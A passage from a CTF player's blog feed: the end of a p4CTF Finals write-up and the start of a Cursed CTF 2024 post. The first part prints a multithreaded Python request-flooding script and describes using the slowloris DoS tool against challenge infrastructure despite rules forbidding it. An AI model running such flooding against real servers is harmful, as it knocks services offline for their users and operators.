&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;workerHttp&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketStream&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packetStream err&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Ban&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Minute&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;banning suspicious connection = %+v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;go&lt;/code&gt; before &lt;code&gt;workerFirewall()&lt;/code&gt; essentially means that the function runs asynchronosly, allowing &lt;code&gt;workerHttp()&lt;/code&gt; to be ran alongside &lt;code&gt;workerFirewall()&lt;/code&gt;, which bans our IP address.&lt;/p&gt;
&lt;p&gt;Clearly, we are trying to race the functions in order to send a request where &lt;code&gt;workerFirewall()&lt;/code&gt; takes longer than 5 seconds to respond and ban our IP, so we are able to fetch the flag before we are banned. This is also hinted by in the challenge description.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you be faster enough?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The naive approach is to simply flood the server with requests on one computer, and use another computer with a seperate IP to request the flag, hoping that the server will lag enough that their IP takes &amp;gt;5 seconds to be banned.&lt;/p&gt;
&lt;p&gt;I coded up a horrendous partially GPT generated python script, with threads to continuesly ping the server to see if this was even viable.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;not_ddos.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import requests
import threading
import time


def flood():
    for i in range(10000000):
        resp = requests.get(&amp;#34;http://10.0.14.2:8080/flag&amp;#34;)
        #print(resp.text)
    print(&amp;#34;ended&amp;#34;)

# Number of threads to run
num_threads = 3000

# Create and start the threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=flood, name=f&amp;#34;Thread-{i&amp;#43;1}&amp;#34;)
    thread.start()
    threads.append(thread)
    print(i)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print(&amp;#34;All threads have completed.&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Surprisingly, it actually worked! With a teammate&amp;rsquo;s computer, they requested the &lt;code&gt;/flag&lt;/code&gt; endpoint with their not-yet-banned IP, and got this message:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Validating your request [1/5], please wait 🐸🐸🐸
Validating your request [2/5], please wait 🐸🐸🐸
Sad 🐸 You are banned 😢
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We got to &lt;code&gt;2/5&lt;/code&gt;, meaning it lagged the server for around 1 second! Clearly, we just needed a few more requests.&lt;/p&gt;
&lt;p&gt;However, it was at this point when my team started trying to persuade me against DDoS&amp;rsquo;ing the challenge infra, as I took their computers away for more manpower. To be fair, it was in the rules that attacking infra and brute force attacks were not allowed.&lt;/p&gt;

  &lt;img src=&#34;./img/rules.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;So after several failed attemps with thousands of python threads and another teammate&amp;rsquo;s computer, I asked the organisers in person if what I was doing is intended and if it was allowed.&lt;/p&gt;
&lt;p&gt;I was told it wasn&amp;rsquo;t intended (wasn&amp;rsquo;t too surprising) and a maybe for if it was allowed. So I took it as a yes and continued my method.&lt;/p&gt;
&lt;p&gt;Without my teammate&amp;rsquo;s support and resources, I would need to find a way to lag the server using just one computer. What I was doing was essentially DoS&amp;rsquo;ing the infra with my own script - but there are lots of DoS scripts out there already! So why not just steal one from GitHub?&lt;/p&gt;
&lt;p&gt;I came across &lt;a href=&#34;https://github.com/gkbrk/slowloris&#34;&gt;this DoS tool&lt;/a&gt; which looked good, using sockets instead of requests.&lt;/p&gt;

  &lt;img src=&#34;./img/slowloris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Modifying the code to accept floats as delay values for even faster DoS&amp;rsquo;ing, I convinced my teammate that it was not a DoS script and I was not breaking any rules, quick just &lt;code&gt;curl /flag&lt;/code&gt; endpoint easy flag.&lt;/p&gt;
&lt;p&gt;And it worked.&lt;/p&gt;

  &lt;img src=&#34;./img/ddos_lol.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Here you can see on my teammate &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;torry2&amp;rsquo;s&lt;/a&gt; computer, we successfully lagged the server enough with the DoS tool and blooded the challenge &lt;code&gt;p4{wow-you-are-very-fast-pepega!}&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/pepega_blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;h4 id=&#34;intended-solution&#34;&gt;Intended solution&lt;/h4&gt;
&lt;p&gt;After the event, it was revealed that out of the 5 teams that solved the challenge, none of their solutions were intended - everyone went with the request flooding method.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cypis&lt;/code&gt;, the challenge author, later revealed that only 1 packet, not 100000, was required to solve the challenge.&lt;/p&gt;
&lt;p&gt;We can see that &lt;code&gt;workerFirewall()&lt;/code&gt; uses &lt;code&gt;GetPacketInfo()&lt;/code&gt; to obtain our remote IP, so we could make the function hang or return an error to cause our IP to never be returned.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;layers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackAll&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IPv4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ipv4&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not ip packet&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;().(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not tcp packet&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcAddr&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromPort&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcPort&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToIP&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstAddr&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToPort&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstPort&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I did think of this before trying the other method, but I didn&amp;rsquo;t know how to edit packets in Wireshark or &lt;code&gt;tcprelay&lt;/code&gt; some malformed packets to do so.&lt;/p&gt;
&lt;p&gt;cypis posted the solve script on discord, using &lt;code&gt;scapy&lt;/code&gt; to relay the packets in python, which is cool. I think (correct me if I&amp;rsquo;m wrong) the solution causes &lt;code&gt;layers.UnpackAll(data, packet.IPv4)&lt;/code&gt; to hang due to a malformed packet pointing out of bounds somewhere.&lt;/p&gt;

  &lt;img src=&#34;./img/intended.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Overall I thought it was a fun challenge, and despite the funny unintended solution, the intended solution was quite nice as well!&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;p4CTF Finals was definetely one of the best CTFs I&amp;rsquo;ve been to, not to mention meeting everyone from top teams was really cool! After the event there was an after party, and it was fun talking to the organisers and competitors.&lt;/p&gt;
&lt;p&gt;Again, huge thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting the event, and our sponsors who made it possible for us to go! And thanks to my teammates &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;&lt;code&gt;toasterpwn&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/_bradan&#34;&gt;&lt;code&gt;bradan&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;&lt;code&gt;torry2&lt;/code&gt;&lt;/a&gt; for playing with me!&lt;/p&gt;
&lt;p&gt;If we qualify next year, I&amp;rsquo;ll definetely be coming to the event again - given that our travel does not take 50 hours again!&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/irl_scoreboard.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>Bribery, Botting, and other Shenanigans - Cursed CTF 2024</title>
      <link>https://TheSavageTeddy.github.io/posts/cursedctf-2024/</link>
      <pubDate>Mon, 01 Apr 2024 06:43:20 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/cursedctf-2024/</guid>
      <description>Overview Cursed CTF Quals 2024 was a CTF designed to contain cursed things like most of the CTF being OSINT, unsolvable challenges, and other funny challenges.
I played with the Oceania Merger team joseph fan club and we managed to secure first place without being disqualified!
In this post, we will go through the funny moments of the event, and how we were able to win using unethical strategies such as bribing organisers, making 10000 accounts for a stuffed cow, and much more.</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://ctftime.org/event/2239&#34;&gt;Cursed CTF Quals 2024&lt;/a&gt; was a CTF designed to contain cursed things like most of the CTF being OSINT, unsolvable challenges, and other funny challenges.&lt;/p&gt;
&lt;p&gt;I played with the Oceania Merger team &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;&lt;code&gt;joseph fan club&lt;/code&gt;&lt;/a&gt; and we managed to secure first place without being disqualified!&lt;/p&gt;
&lt;p&gt;In this post, we will go through the funny moments of the event, and how we were able to win using &lt;del&gt;un&lt;/del&gt;ethical strategies such as bribing organisers, making 10000 accounts for a stuffed cow, and much more. Enjoy!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 90%; &#34;  /&gt;


&lt;h1 id=&#34;the-iceberg-explained&#34;&gt;The Iceberg Explained&lt;/h1&gt;
&lt;p&gt;We will use this iceberg, inspired by &lt;a href=&#34;https://x.com/gf_256/status/1206393845497376768?s=20&#34;&gt;cts&lt;/a&gt;, to rank each funny/cursed moment of the CTF.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 70%; &#34;  /&gt;


&lt;p&gt;Each level of the iceberg is pretty self explanatory. Anything in the orange or below would probably cause some drama and/or banning in a normal CTF.&lt;/p&gt;
&lt;p&gt;Without further ado, here are all of the funny and cursed moments from Cursed CTF 2024!&lt;/p&gt;
&lt;h2 id=&#34;login-button-covered&#34;&gt;Login button covered&lt;/h2&gt;
&lt;p&gt;To even login to the CTF, you had to get around the button which was covered by some animated sparkles.&lt;/p&gt;

  &lt;img src=&#34;./img/covered_button.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;It wasn&amp;rsquo;t very hard to get around, just by inspect element deleting or adblocking etc. but there was actually a very small gap on top that you could click.&lt;/p&gt;
&lt;p&gt;There were also many random things floating around the page like My Little Pony, which was a bit annoying.&lt;/p&gt;
&lt;p&gt;Not too cursed, but a good start.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;challenge-author-participation&#34;&gt;Challenge author participation&lt;/h2&gt;
&lt;p&gt;I actually authored a crypto challenge for this CTF, named &lt;code&gt;fuck-joseph&lt;/code&gt;, and yet I was allowed to participate.&lt;/p&gt;

  &lt;img src=&#34;./img/allowed_to_qual.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;The challenge itself was quite simple - simply crack a 512 bit RSA modulus, and the flag is yours:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; flag &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; flag
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; getPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(n)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(pow(bytes_to_long(flag), e, n))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The intended solution was to &lt;a href=&#34;https://github.com/eniac/faas&#34;&gt;drop $100 on a cluster&lt;/a&gt; to factor &lt;code&gt;n&lt;/code&gt;, but since I made the challenge and had the flag, I just blooded it immediately after the CTF started.&lt;/p&gt;

  &lt;img src=&#34;./img/own_chal_blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;I should probably elaborate on the challenge name &amp;ldquo;fuck joseph&amp;rdquo;. &lt;a href=&#34;https://twitter.com/josep68_&#34;&gt;joseph&lt;/a&gt; is a CTF player, who my main team (Emu Exploit) jokingly despises due to how good he is. The intended joke was to troll him with an &amp;lsquo;unsolvable&amp;rsquo; / pay to win crypto challenge for him to solve, as crypto is his specialty.&lt;/p&gt;
&lt;p&gt;This kind of backfired however as we decided to play in our &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;Oceania Merger team&lt;/a&gt;, which joseph was in, and now we had to solve the challenge.&lt;/p&gt;
&lt;p&gt;No hate to joseph btw, we are joseph fan club after all &amp;lt;3&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;primes-uploaded-to-factordb&#34;&gt;Primes uploaded to factordb&lt;/h2&gt;
&lt;p&gt;With my &lt;code&gt;fuck-joseph&lt;/code&gt; challenge, I thought I was guaranteed around ~500 free points as not many would bother factoring a 512 bit number. However, it turns out someone uploaded the factors to &lt;a href=&#34;http://factordb.com/&#34;&gt;factordb&lt;/a&gt;, resulting in &amp;gt;30 solves.&lt;/p&gt;

  &lt;img src=&#34;./img/fuck_joseph_solves.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;
  &lt;img src=&#34;./img/iceberg.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 70%; &#34;  /&gt;


I suspect &lt;a href=&#34;https://twitter.com/0rganizers&#34;&gt;0rganizers&lt;/a&gt; to be the culprit, being the second solve. But I can&amp;rsquo;t really be mad - it&amp;rsquo;s a cursed CTF after all. Props to them for solving it legitimately, too.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit: it was &lt;a href=&#34;./img/nahhh.png&#34;&gt;actually a organiser&lt;/a&gt;, but they also solved it legitimately lol&lt;/em&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;registering-10000-accounts-for-a-cow-plushie&#34;&gt;Registering 10000 accounts for a cow plushie&lt;/h2&gt;
&lt;p&gt;There was a prize of a cute cow plushie for the median team on the scoreboard.&lt;/p&gt;

  &lt;img src=&#34;./img/cow.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 30%; &#34;  /&gt;


&lt;p&gt;Originally, I didn&amp;rsquo;t even know this prize existed, until organiser sky encouraged us to go for it.&lt;/p&gt;

